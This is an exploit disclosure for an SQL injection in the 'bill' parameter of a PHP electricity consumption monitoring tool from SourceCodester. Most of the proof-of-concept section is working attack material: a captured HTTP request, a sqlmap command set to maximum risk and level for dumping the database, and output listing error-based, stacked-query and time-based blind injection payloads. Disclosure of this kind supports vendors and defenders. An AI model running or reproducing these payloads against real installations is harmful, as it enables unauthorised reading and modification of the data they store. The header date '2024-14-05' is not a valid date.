# Electricity Consumption Monitoring Tool - SQL Injection
+ **Exploit Title:** Electricity Consumption Monitoring Tool - SQL Injection
+ **Date:** 2024-14-05
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://www.sourcecodester.com/php/17328/electricity-consumption-monitoring-tool-using-php-and-mysql-source-code.html
+ **Software Link:** https://www.sourcecodester.com/download-code?nid=17328&title=Electricity+Consumption+Monitoring+Tool+Using+PHP+and+MySQL+with+Source+Code
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Electricity Consumption Monitoring Tool allows SQL Injection via the 'bill' parameter at "http://localhost/electricity-comsumption-monitoring/endpoint/delete-bill.php?bill=11"
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: http://localhost/electricity-comsumption-monitoring/
+ Click the delete button.
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:

```
GET /electricity-comsumption-monitoring/endpoint/delete-bill.php?bill=11 HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="123", "Not:A-Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
```

+ Use sqlmap to exploit. In sqlmap, use 'bill' parameter to dump the database.
```
sqlmap -r r.txt -p bill --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: bill (GET)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: bill=11' AND EXTRACTVALUE(7545,CONCAT(0x5c,0x7170766a71,(SELECT (ELT(7545=7545,1))),0x71786a6271))-- hefU

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: bill=11';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: bill=11' AND (SELECT 6978 FROM (SELECT(SLEEP(5)))FJrn)-- mPTe
---
[18:29:47] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[18:29:47] [INFO] fetching current database
[18:29:47] [INFO] retrieved: 'electricity_db'
current database: 'electricity_db'

```
+ current database: `electricity_db`

![Ekran görüntüsü 2024-05-19 164445](https://github.com/BurakSevben/CVEs/assets/117217689/93a056dc-46df-4adf-88c8-65d7f1de1b09)

